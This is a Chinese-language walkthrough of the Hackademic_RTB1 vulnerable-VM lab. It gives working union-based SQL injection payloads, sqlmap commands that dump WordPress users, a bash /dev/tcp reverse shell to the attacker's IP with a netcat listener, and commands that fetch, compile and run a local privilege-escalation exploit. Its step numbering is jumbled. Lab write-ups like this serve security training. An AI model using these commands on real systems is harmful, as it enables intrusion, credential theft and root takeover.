1.使用nmap扫描端口

nmap -p- -T4 192.168.168.138

发现80端口开放并且对方服务为Apache服务

通过插件，主题的漏洞去渗透Wordpress站点，于是WPScan应运而生，收集 Wordpress的各种漏洞，形成一个Wordpress专用扫描器

2.进入80端口页面

3.测试闭合符

发现为数字型

经测试发现字段数为5****，回显位为2

查出当前数据库名为”wordpress” 并查出表名”wp_users”（转16进制后加0x绕过单双引号）

查询当前库”wordpress”****下的所有表名

?cat=0 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema = 0x776f72647072657373

查询所有库名?cat=0 union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata

4.sqlmap跑出数据库” wordpress”中”wp_users”表中数据

sqlmap -u http://192.168.168.138/Hackademic_RTB1/?cat=1 –dbms=mysql –batch -D wordpress -T wp_users –dump

sqlmap -u http://192.168.168.138/Hackademic_RTB1/?cat=1 –dbs –batch -D wordpress -T wp_users –dump

5.使用wpscan –url http://192.168.168.138(http默认端口80)

发现登录后台界面login.page

http://192.168.168.138/Hackademic_RTB1/wp-login.php

**5.**扫描目录（也可以扫出登录界面）

dirsearch -u http://192.168.168.138/Hackademic_RTB1/ -x 403 （排除403的）

9.在kali开启监听

*nc -lvvp 8085 //在攻击端使用netcat监听8083*端口

-l 监听模式

p 指定端口

在蚁剑上反弹

*调用bash***建立一个交互式的shell,**并实现双向通信

bash -i >& /dev/tcp/192.168.168.128/8085 0>&1 注意：这里的ip是kali的ip

然后python -c ‘import pty; pty.spawn(“/bin/bash”)’ //使用python调用bash，确保获取的shell为可交互式

11.复制漏洞模块15285.c到web目录下

查看漏洞模块的绝对路径 searchsploit -p linux/local/15285.c

sudo cp /usr/share/exploitdb/exploits/linux/local/15285.c /var/www/html

**cd /tmp //**移动到临时目录，并下载漏洞模块到本地

wget http://192.168.168.128/15285.c 下载漏洞模块到本地

*gcc -o exp 15285.c //使用gcc编译，将漏洞模块编译输出名为exp*的文件

*chmod 777 exp //给予777权限*

./exp 执行exp
